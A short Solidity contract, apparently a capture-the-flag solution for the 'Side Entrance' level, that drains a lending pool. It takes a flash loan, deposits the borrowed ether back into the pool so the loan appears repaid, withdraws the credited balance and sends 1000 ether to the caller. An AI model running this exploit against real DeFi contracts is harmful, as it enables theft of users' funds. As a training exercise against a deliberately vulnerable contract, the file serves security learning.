// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function attack() external {
        // flashloan
        pool.flashLoan(1000 * 1e18);

        // withdraw
        pool.withdraw();
        payable(msg.sender).call{value: 1000 * 1e18}("");
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }
}
